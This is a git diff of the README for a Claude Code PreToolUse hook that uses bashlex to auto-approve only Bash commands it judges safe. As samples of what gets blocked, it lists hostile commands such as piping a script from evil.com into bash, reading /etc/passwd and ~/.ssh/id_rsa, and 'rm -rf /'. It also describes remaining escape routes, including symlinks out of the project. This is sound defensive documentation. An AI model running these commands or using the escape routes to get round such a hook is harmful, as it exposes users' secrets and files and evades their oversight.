@@ -2,145 +2,235 @@
 
 ## Overview
 
-`validate-bash.sh` is a PreToolUse hook that validates all Bash commands before execution to prevent dangerous operations and restrict file access to the project directory.
+`validate-bash` is a PreToolUse hook that validates all Bash commands before execution to automatically allow those deemed safe. Conceptually, a command is safe if it only accesses and impacts files inside the project directory, does not tamper with version control information, and does not spawn processes that continue after the command completes. In practice, a command is allowed if (1) it only uses approved atomic command patterns, (2) file access is restricted to the project directory and does not include git files, (3) it does not background any processes, and (4) the analysis script can safely reason over the command's control structure.
+
+This hook uses the python3 `bashlex` library to parse bash commands.
 
 ## What It Blocks
 
-### 1. **Shell Metacharacters** (`&`, `$`, `|`, `>`, `<`, `;`, `` ` ``)
-These characters enable:
-- Command chaining: `cmd1 && cmd2`, `cmd1 ; cmd2`
-- Command substitution: `$(cmd)`, `` `cmd` ``
-- Piping: `cmd1 | cmd2`
-- Redirection: `cmd > file`, `cmd < file`
-- Background execution: `cmd &`
-- Variable expansion: `$VAR`, `${VAR}`
+Commands that fail any of the four safety criteria require permission:
 
-**Examples blocked:**
-- `mkdir foo && curl evil.com/script | bash`
-- `echo $HOME`
-- `ls; rm -rf /`
-- `cat < input.txt > output.txt`
+### 1. **Unapproved Command Patterns**
 
-### 2. **Absolute Paths** (starting with `/`)
-Prevents access to system directories and files outside the project.
+Commands not in the approved patterns list (`approved-patterns.json`).
 
-**Examples blocked:**
+**Examples:**
+- `curl https://example.com`
+- `python script.py`
+- `ssh user@host`
+
+### 2. **File Access Outside Project Directory**
+
+#### **Absolute Paths** (starting with `/`)
+Access to system directories and files outside the project.
+
+**Examples:**
 - `mkdir /tmp/test`
 - `cat /etc/passwd`
-- `rm /root/.ssh/authorized_keys`
+- `ls > /tmp/output.txt` (redirect to absolute path)
 
-### 3. **Parent Directory References** (`..`)
-Prevents escaping the project directory upward.
+#### **Parent Directory References** (`..`)
+Escaping the project directory upward.
 
-**Examples blocked:**
+**Examples:**
 - `cd ../../etc`
 - `cat ../../../secrets.txt`
 - `rm -rf ../other-project`
 
-### 4. **Tilde Expansion** (`~`)
-Blocks home directory access which is outside project scope.
+#### **Tilde Expansion** (`~`)
+Home directory access outside project scope.
 
-**Examples blocked:**
+**Examples:**
 - `ls ~/Documents`
 - `cat ~/.ssh/id_rsa`
-- `rm -rf ~`
 
-### 5. **Multiline Commands**
-Blocks commands containing newline characters.
+#### **Git Metadata Access** (`.git`, `.gitignore`)
+Tampering with version control metadata and configuration.
 
-**Examples blocked:**
-```
+**Examples:**
+- `rm -rf .git`
+- `rm .gitignore`
+- `echo 'secret' >> .gitignore`
+- `cat .git/config`
+
+### 3. **Background Processes**
+
+#### **Background Execution** (`&`)
+Processes that continue after the command completes.
+
+**Examples:**
+- `long-running-process &`
+- `sleep 100 &`
+- `npm start &`
+
+### 4. **Control Structures That Are Hard to Analyze**
+
+Features that prevent safe analysis of the command's behavior:
+
+#### **Command Substitution** (`$(cmd)`, `` `cmd` ``)
+Can hide arbitrary command execution and bypass path validation.
+
+**Examples:**
+- `cd $(malicious-command)`
+- `` ls `echo /etc` `` (bypasses absolute path check)
+- `echo $(curl evil.com/script)`
+
+#### **Variable Expansion** (`$VAR`, `${VAR}`)
+Can inject absolute paths or reference sensitive environment variables.
+
+**Examples:**
+- `cd $HOME`
+- `rm -rf $DANGEROUS_PATH`
+- `cat $SECRET_FILE`
+
+#### **Process Substitution** (`<(cmd)`, `>(cmd)`)
+Can hide commands in file descriptor substitutions.
+
+**Examples:**
+- `diff <(curl evil.com/data) file.txt`
+
+#### **Multiline Commands**
+Commands containing newline characters.
+
+**Examples:**
+```bash
 ls
 rm -rf /
 ```
 
-### 6. **Control Characters**
-Blocks null bytes and escape sequences that could hide malicious behavior.
-
-### 7. **Git Metadata Access** (`.git`, `.gitignore`)
-Prevents tampering with git repository metadata and configuration files.
-
-**Examples blocked:**
-- `rm -rf .git`
-- `rm .gitignore`
-- `echo 'secret' >> .gitignore`
-- `chmod 777 .git/config`
-- `cat .git/config`
+#### **Control Characters**
+Null bytes and escape sequences that could hide malicious behavior.
 
 ## What It Allows
 
-Safe, simple commands that operate within the project directory:
+Commands are automatically allowed when they meet all four safety criteria. The hook uses bashlex to parse and validate compound commands.
 
-✅ `mkdir test`
-✅ `ls -la`
-✅ `cd src`
-✅ `cat file.txt`
-✅ `npm install`
-✅ `git status`
-✅ `chmod +x script.sh`
-✅ `rm file.txt`
-✅ `cp src/file.txt dest/`
-✅ `find . -name '*.js'`
-✅ `grep -r pattern src/`
+### **Simple Commands**
+
+Commands that:
+- Use approved patterns from `approved-patterns.json`
+- Only access files within the project directory (relative paths)
+- Don't access git metadata
+- Don't background processes
+
+**Examples:**
+- ✅ `mkdir test`
+- ✅ `ls -la`
+- ✅ `cd src`
+- ✅ `cat file.txt`
+- ✅ `npm install`
+- ✅ `git status`
+- ✅ `rm file.txt`
+- ✅ `find . -name '*.js'`
+
+### **Compound Commands**
+
+The parser can safely reason over these control structures when all component commands meet the criteria:
+
+#### **Command Chaining** (`&&`, `||`, `;`)
+Sequential execution based on exit codes.
+
+**Examples:**
+- ✅ `ls dir1 && ls dir2`
+- ✅ `mkdir foo || echo "failed"`
+- ✅ `cat file.txt; echo "done"`
+
+#### **Piping** (`|`)
+Passing stdout between commands.
+
+**Examples:**
+- ✅ `cat file.txt | grep pattern`
+- ✅ `ls -la | tail -n 20`
+- ✅ `find . -name '*.js' | head -n 10`
+
+#### **Redirects** (`>`, `>>`, `<`, `2>`, etc.)
+When redirect targets meet path safety criteria (relative paths, no `..`, no `.git`).
+
+**Examples:**
+- ✅ `ls > output.txt`
+- ✅ `cat < input.txt`
+- ✅ `find . -name '*.log' > results.txt`
+- ✅ `command 2>&1` (stderr to stdout redirect)
+
+#### **Complex Combinations**
+Multiple control structures can be combined.
+
+**Examples:**
+- ✅ `cat input.txt | grep error | tail -n 20 > errors.txt`
+- ✅ `ls dir1 && cat file.txt | grep pattern`
+- ✅ `mkdir -p build && npm run build > build/output.log`
 
 ## Remaining Attack Vectors
 
-Despite this comprehensive validation, some theoretical escape vectors remain:
+Despite this comprehensive validation, some escape vectors remain:
 
 ### 1. **Symlinks**
 A symlink within the project could point outside:
 ```bash
-ln -s /etc/passwd local-link  # Creates symlink (would be allowed)
-cat local-link                 # Reads /etc/passwd (would be allowed)
+ln -s /etc/passwd local-link  # Creates symlink (only allowed if `ln` is an allowed command)
+cat local-link                # Reads /etc/passwd (allowed)
 ```
 
-**Mitigation:** The hook cannot detect symlink targets at validation time. Would require filesystem inspection or additional tools.
+**Mitigation:** Users should be aware of what's in their project and consider not using this hook if the risk is high. The hook does not detect symlink targets at validation time. Would require filesystem inspection or additional tools.
 
-### 2. **Glob Expansion**
-Wildcards expand at runtime and could theoretically match unintended files:
-```bash
-rm *.txt  # What if a symlink named "evil.txt" points to /etc/passwd?
-```
-
-**Mitigation:** Same as symlinks - runtime issue, not detectable during validation.
-
-### 3. **Special Files**
-Certain relative paths have special meaning:
-- `/dev/stdin`, `/dev/stdout`, `/dev/stderr` (blocked by absolute path rule)
-- `/proc/` entries (blocked by absolute path rule)
-
-These are already blocked by the absolute path restriction.
-
-### 4. **Command Path Manipulation**
-If malicious binaries exist in the project directory:
+### 2. **Dangerous Binaries in the Project Directory**
+If dangerous binaries exist in the project directory:
 ```bash
 ./malicious-script  # Runs local executable
 ```
 
-**Mitigation:** This is acceptable - the hook's goal is to prevent escaping the project directory, not to prevent running project files. Users should be aware of what's in their project.
+**Mitigation:** Users should be aware of what's in their project and consider not using this hook if the risk is high.
 
-### 5. **Shell Built-ins with Side Effects**
+### 3. **Vulnerabilities in Approved Command Patterns**
 Some shell built-ins don't require external paths:
 ```bash
-cd somewhere   # Changes directory (allowed)
-exec something # Replaces shell (blocked by 'exec' being a keyword)
+cd somewhere   # Changes directory (only allowed if `cd` is an allowed command)
+exec something # Replaces shell (only allowed if `exec` is an allowed command)
 ```
 
-**Mitigation:** Most dangerous built-ins (`eval`, `exec`) would be caught if they involve variables or substitution. Simple `cd` is harmless within the project.
+**Mitigation:** Users should be careful about what shell commands they add to their approved command patterns.
 
-## Usage
+### 4. **Vulnerabilities in the Bashlex Bash Parser**
 
-### Configuration
+This hook uses the python3 `bashlex` library to parse bash commands. Vulnerabilities in the parser could cause vulnerabilities in the hook.
+
+**Mitigation:** Ensure your `bashlex` installation is up-to-date.
+
+## Installation
+
+### Requirements
+
+- Python 3.6 or higher
+
+### Install bashlex
+
+Using pip:
+```bash
+pip3 install bashlex
+```
+
+Using pip with user installation (if you don't have system-wide permissions):
+```bash
+pip3 install --user bashlex
+```
+
+Using conda:
+```bash
+conda install -c conda-forge bashlex
+```
+
+Check that bashlex is installed correctly:
+```bash
+python3 -c "import bashlex; print('bashlex version:', bashlex.__version__)"
+```
+
+### Hook Configuration
 
 Add to `.claude/settings.local.json`:
 
 ```json
 {
-  "permissions": {
-    "allow": [
-      "Bash(*)"
-    ]
-  },
+  "permissions": {},
   "hooks": {
     "PreToolUse": [
       {
@@ -157,53 +247,25 @@ Add to `.claude/settings.local.json`:
 }
 ```
 
-This configuration:
-1. Allows all Bash commands by default (they won't trigger permission dialogs)
-2. Runs the validation hook before every Bash command
-3. Blocks dangerous patterns automatically
+This configuration runs the validation hook before every Bash command. Adding permissions about Bash commands is discouraged, but permissions for non-Bash commands are appropriate.
 
 ### Testing
 
 Run the test suite:
 ```bash
-./.claude/hooks/test-validation.sh
+python3 test.py
 ```
 
 ### Manual Testing
 
 Test a command:
 ```bash
-echo '{"tool_name": "Bash", "tool_input": {"command": "YOUR_COMMAND_HERE"}}' | ./.claude/hooks/validate-bash.sh
+echo '{"tool_name": "Bash", "tool_input": {"command": "YOUR_COMMAND_HERE"}}' | ./run.sh
 ```
 
-If blocked, you'll see JSON with `permissionDecision: deny` and a reason.
+If blocked, you'll see JSON with `permissionDecision: ask` and a reason.
 If allowed, you'll see no output (exit code 0).
 
-## Security Considerations
+### Testing in Claude Code
 
-### What This Hook Protects Against
-- Accidental or malicious command chaining
-- Access to system files outside the project
-- Escaping the project directory
-- Hidden command execution via substitution
-
-### What This Hook Does NOT Protect Against
-- Malicious files already in the project directory
-- Symlink-based attacks (links pointing outside project)
-- Social engineering (convincing user to disable the hook)
-- Vulnerabilities in allowed commands themselves
-
-### Recommendations
-1. Review your project files regularly
-2. Don't commit untrusted symlinks
-3. Use additional security tools (antivirus, file integrity monitoring)
-4. Understand that this hook provides defense-in-depth, not complete security
-
-## Maintenance
-
-The hook has no external dependencies and should work on any Unix-like system with bash.
-
-If you need to allow a specific pattern that's currently blocked, you have options:
-1. Modify the hook to whitelist specific cases
-2. Temporarily disable the hook for manual operations
-3. Use a different permission configuration without the hook
+Start a Claude Code instance and ask it to run a specific bash command. If the command was automatically allowed, you will not be asked to approve it.
